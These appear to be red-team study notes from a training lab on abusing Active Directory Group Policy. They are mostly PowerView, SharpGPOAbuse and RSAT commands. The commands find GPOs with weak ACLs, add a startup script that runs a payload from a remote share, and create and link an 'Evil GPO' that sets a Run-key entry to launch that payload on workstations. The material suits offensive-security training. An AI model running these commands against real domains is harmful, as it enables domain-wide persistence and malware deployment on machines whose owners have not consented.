# Group Policy Notes

**Modifying Existing GPO**

Tools:
[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

steps:
1. enum all GPO's in the domain,
2. check ACL of each one
3. filter for which a principal has modify privileges
   - CreateChild
   - WriteProperty
   - GenericWrite
4. filter any legitimate principals including SYSTEM, DA's or EA's

```
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
powershell ConvertFrom-SID <SID>
powershell Get-DomainOU -GPLink "{<GPO SID>}" | select distinguishedName
powershell Get-DomainComputer -SearchBase "<GPO distinguishedname>" | select dnsHostName
can manually change these files in this path:
ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{<GPO>}
or using SharpGPOAbuse:
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
```

the victim would need to ```run gpupdate /force``` then reboot to apply


**Create and Link a GPO**

Finding GPO's that are stored in System Policies that can create new GPOs in the domain with the "Create GroupPolicyContainer objects" using Powerview by looking for those that have "CreateChild" rights on the "Group-Policy-Container", and then resolving their SIDs to readable names.
```
powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
```

need to also find those that are linked to an OU for abuse
```
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
```

Using Powershell RSAT modules to make changes, only usually found on management workstations
```
powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
powershell New-GPO -Name "Evil GPO"
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
```
